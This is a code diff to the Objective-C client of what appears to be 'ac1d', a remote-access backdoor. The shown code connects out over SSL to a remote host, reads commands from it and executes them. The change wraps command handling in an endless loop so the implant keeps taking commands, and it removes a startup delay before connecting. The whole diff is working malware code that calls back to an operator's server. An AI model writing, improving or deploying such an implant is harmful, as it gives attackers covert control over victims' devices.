@@ -103,17 +103,19 @@ void interactWithServer(NSString *remoteHost, int remotePort) {
     ac1d *ac1d_base = [[ac1d alloc] init];
     ac1d_base->client_ssl = client_ssl;
     
-    char buffer[2048] = "";
-    SSL_read(client_ssl, buffer, sizeof(buffer));
-    NSString *terminator = [NSString stringWithFormat:@"%s", buffer];
-    memset(buffer, '\0', 2048);
+    while (YES) {
+        char buffer[2048] = "";
+        SSL_read(client_ssl, buffer, sizeof(buffer));
+        NSString *terminator = [NSString stringWithFormat:@"%s", buffer];
+        memset(buffer, '\0', 2048);
     
-    if (debug) printf("[i] Current client terminator: %s\n", [terminator UTF8String]);
+        if (debug) printf("[i] Current client terminator: %s\n", [terminator UTF8String]);
     
-    while (SSL_read(client_ssl, buffer, sizeof(buffer))) {
+        SSL_read(client_ssl, buffer, sizeof(buffer));
         NSMutableArray *args = [NSMutableArray arrayWithArray:[[NSString stringWithUTF8String:buffer] componentsSeparatedByString:@" "]];
         if (debug) printf("[+] Got command from %s:%d!\n", [remoteHost UTF8String], remotePort);
         if (debug) printf("[*] Executing %s...\n", [args[0] UTF8String]);
+        
         if ([commands containsObject:args[0]]) {
             NSString *result = [ac1d_base sendCommand:args];
             if (result) {
@@ -145,7 +147,6 @@ void connectToServer(NSString *remoteHost, int remotePort) {
     serverAddress.sin_port = htons(remotePort);
     if (debug) printf("[+] ac1d SSL handler loaded!\n");
     if (debug) printf("[*] Connecting to %s:%d...\n", [remoteHost UTF8String], remotePort);
-    [NSThread sleepForTimeInterval:5.0f];
     if (connect(sockfd, (struct sockaddr *)&serverAddress, sizeof(serverAddress)) < 0) {
         if (debug) printf("[-] Failed to connect!\n");
         return;
